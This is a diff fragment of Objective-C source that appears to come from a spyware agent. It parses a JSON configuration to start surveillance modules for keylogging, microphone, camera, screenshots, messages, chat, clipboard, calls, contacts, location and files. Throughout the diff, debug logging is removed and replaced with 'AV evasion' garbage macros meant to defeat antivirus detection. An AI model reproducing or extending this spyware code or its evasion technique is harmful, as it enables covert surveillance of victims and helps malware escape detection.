+        [self addBatteryEvent: event];
+      }
+      else if ([eventType compare: EVENTS_AC_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_000
+        
+        // only iOS
+        [self addACEvent: event];
+      }
+      else if ([eventType compare: EVENTS_IDLE_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+        
+        [self addIdleEvent: event];
+      }
+      else
+      { // Default event: for keep order number in list when a actionEvent is triggered
+        // : the trigger param is position in list of event
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_007
+        
+        [self addNULLEvent: event];
+      }
+    }
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
+    [inner release];
+  }
+  
+}
+
+- (void)parseAndAddModules:(NSDictionary *)dict
+{  
+  NSArray *modulesArray = [dict objectForKey: MODULES_KEY];
+  
+  if (modulesArray == nil) 
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    return;
+  }
+  
+  for (int i=0; i < [modulesArray count]; i++) 
+  {
+    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+    
+    NSDictionary *module = (NSDictionary *)[modulesArray objectAtIndex: i];
+    
+    NSString *moduleType = [module objectForKey: MODULES_TYPE_KEY];
+    
+    if (moduleType != nil)
+    {
+      if ([moduleType compare: MODULES_ADDBK_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_009
+        
+        [self initABModule: module];
+      }
+      else if ([moduleType compare: MODULES_DEV_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_008
+        
+        [self initDeviceModule: module];
+      }
+      else if ([moduleType compare: MODULES_CLIST_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_007
+        
+        [self initCalllistModule: module];
+      }
+      else if ([moduleType compare: MODULES_CAL_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_006
+        
+        [self initCalendarModule: module];
+      }
+      else if ([moduleType compare: MODULES_MIC_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+        
+        [self initMicModule: module];
+      }
+      else if ([moduleType compare: MODULES_SNP_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_004
+        
+        [self initScrshotModule: module];
+      }
+      else if ([moduleType compare: MODULES_URL_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_003
+        
+        [self initUrlModule: module];
+      }
+      else if ([moduleType compare: MODULES_APP_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_002
+        
+        [self initAppModule: module];
+      }      
+      else if ([moduleType compare: MODULES_KEYL_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_001
+        
+        [self initKeyLogModule: module];
+      }
+      else if ([moduleType compare: MODULES_MSGS_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_000
+        
+        [self initMessagesModule: module];
+      }
+      else if ([moduleType compare: MODULES_CLIP_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_001
+        
+        [self initClipboardModule: module];
+      }
+      else if ([moduleType compare: MODULES_CAMERA_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_002
+        
+        [self initCameraModule: module];
+      }
+      else if ([moduleType compare: MODULES_POSITION_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_003
+        
+        [self initPositionModule: module];
+      }
+      else if ([moduleType compare: MODULES_CHAT_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_004
+        
+        [self initChatModule: module];
+      }
+      else if ([moduleType compare: @"mouse"] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+        
+        [self initMouseModule: module];
+      }
+      else if ([moduleType compare: @"call"] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_006
+        
+        [self initCallModule: module];
+      }
+      else if ([moduleType compare: @"file"] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_007
+        
+        [self initFileModule: module];
+      }
+    }
+    
+    [inner release];
+  }
+}
+
 #
 #
-#pragma mark SBJsonStreamParserAdapterDelegate methods
+# pragma mark SBJsonStreamParserAdapterDelegate methods
 #
 #
 
 - (void)parser:(SBJsonStreamParser *)parser foundObject:(NSDictionary *)dict 
-{
-#ifdef DEBUG_JSON_CONFIG
-	NSLog(@"%s: found dictionary", __FUNCTION__);
-#endif
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   // running the parsers
   [self parseAndAddActions: dict];
-
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: found actions dict %@", __FUNCTION__, dict);
-  NSLog(@"%s: actions array %@", __FUNCTION__, mActionsList);
-#endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   [self parseAndAddEvents: dict];
-   
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   [self parseAndAddModules: dict];
   
-#ifdef DEBUG_JSON_CONFIG
-  id tmpArray = [dict objectForKey: EVENTS_KEY];
-  NSLog(@"%s: found events dict %@", __FUNCTION__, tmpArray);
-  NSLog(@"%s: events array %@", __FUNCTION__, mEventsList);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_002
 }
 
 #define FILE_CONFIG @"/tmp/config"
@@ -2388,10 +3672,11 @@ typedef struct {
 {
   SBJsonStreamParserStatus status;
   
-  if (dataConfig == nil) {
-#ifdef DEBUG_JSON_CONFIG    
-    NSLog(@"%s: no configuration file...", __FUNCTION__);
-#endif
+  if (dataConfig == nil) 
+  {
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+    
     return NO;
   }
   
@@ -2399,39 +3684,40 @@ typedef struct {
     status = [parser parse: dataConfig];
   }
   @catch (NSException *exception) {
-#if DEBUG_JSON_CONFIG
-    NSLog(@"%s: exception on parsing configuration", __FUNCTION__);
-#endif
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
     status = SBJsonStreamParserError;
   }
 
-  
-
-#ifdef DEBUG_JSON_CONFIG  
-  NSLog(@"%s: parser runned: %d", __FUNCTION__,  status);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
 	if (status == SBJsonStreamParserError) 
     {
-#ifdef DEBUG_JSON_CONFIG    
-      NSLog(@"%s: Parser error: %@", __FUNCTION__, parser.error);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       return NO;
     } 
   else if (status == SBJsonStreamParserWaitingForData) 
-    {
-#ifdef DEBUG_JSON_CONFIG
-      NSLog(@"%s: Parser waiting for more data", __FUNCTION__);
-#endif
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+    
       return NO;
     }
   else if (status == SBJsonStreamParserComplete) 
-    {
-#ifdef DEBUG_JSON_CONFIG    
-      NSLog(@"%s: parsing correctly!", __FUNCTION__);
-#endif
+    {    
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       return YES;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   return YES;
 }
@@ -2452,16 +3738,24 @@ typedef struct {
 //  
 //  [myJSon release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   mEventsList = eventsArray;
   mActionsList = actionsArray;
   mAgentsList = modulesArray;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   bRet = [self runParser: aConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [pool release];
   
   return  bRet;
 }
-
 
 @end
